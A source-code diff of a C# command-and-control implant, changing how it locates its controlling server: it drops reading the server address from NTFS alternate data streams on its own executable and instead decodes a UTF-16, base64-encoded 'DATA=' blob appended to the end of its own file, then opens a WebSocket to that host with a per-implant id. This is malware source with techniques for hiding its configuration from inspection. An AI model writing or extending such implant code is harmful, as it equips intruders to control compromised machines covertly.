@@ -32,7 +32,6 @@ namespace Implant
 
     public class Implant
     {
-        private string _c2WsUrl;
         private string _group;
         private string _base_url;
         private string _currentDir;
@@ -49,9 +48,8 @@ namespace Implant
         private readonly ConcurrentDictionary<string, string> _uploadDestinations = new ConcurrentDictionary<string, string>();
 
 
-        public Implant(string c2WsUrl, string group = "default", string base_url="127.0.0.1:4000")
+        public Implant( string group = "", string base_url="")
         {
-            _c2WsUrl = c2WsUrl;
             _group = group;
             _base_url = base_url;
             _currentDir = Directory.GetCurrentDirectory();
@@ -85,7 +83,7 @@ namespace Implant
 
             _ws = new ClientWebSocket();
 
-            var uri = new Uri($"{_c2WsUrl}?id={_implId}");
+            var uri = new Uri($"ws://{_base_url}?id={_implId}");
 
             try
             {
@@ -885,30 +883,38 @@ namespace Implant
             {
 
 
-                string exePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
-                string route_adsPath = @"\\?\" + exePath + ":Route";
-                string port_adsPath = @"\\?\" + exePath + ":Port";
-                string group_adsPath = @"\\?\" + exePath + ":Group";
-
-                if (File.Exists(route_adsPath) && File.Exists(port_adsPath) && File.Exists(group_adsPath))
-                {
-                    string route = File.ReadAllText(route_adsPath).Replace(" ", "").Replace("\r", "").Replace("\n", "");
-                    string port = File.ReadAllText(port_adsPath).Replace(" ", "").Replace("\r", "").Replace("\n", "");
-                    string group = File.ReadAllText(group_adsPath).Replace(" ", "").Replace("\r", "").Replace("\n", "");
-
-                    string base_url = $"{route}:{port}";
-                    var c2WsUrl = $"ws://{base_url}/api/rcv";
-                    var groupName = $"{group}";
-
-                    var implant = new Implant(c2WsUrl, groupName, base_url);
-                    await implant.Run();
-
-                }
-                else
-                {
-                }
+                string rutaCompleta = Assembly.GetExecutingAssembly().Location;
+                string nombreArchivo = Path.GetFileName(rutaCompleta);
 
 
+                byte[] datos = File.ReadAllBytes(rutaCompleta);
+
+                // Buscar los últimos 1000 bytes
+                int bytesParaLeer = Math.Min(1000, datos.Length);
+                byte[] finalBytes = new byte[bytesParaLeer];
+                Array.Copy(datos, datos.Length - bytesParaLeer, finalBytes, 0, bytesParaLeer);
+
+                // Primera decodificación de 
+                string texto = Encoding.Unicode.GetString(finalBytes); // Unicode = UTF-16 LE en .NET
+
+                string[] raw_data = texto.Split(new string[] { "DATA=" }, StringSplitOptions.None);
+
+                string base64_data = raw_data[1];
+                byte[] base64Bytes = Convert.FromBase64String(base64_data);
+                string decode_data = Encoding.UTF8.GetString(base64Bytes);
+
+                // Data decodificada utf-16-le --> base64 --> string with data
+
+                string[] data = decode_data.Split('|');
+
+                string url = data[1];
+                string port = data[2];
+                string group = data[3];
+
+
+
+                var implant = new Implant( group, $"{url}:{port}");
+                await implant.Run();
 
             }
             catch (Exception ex)
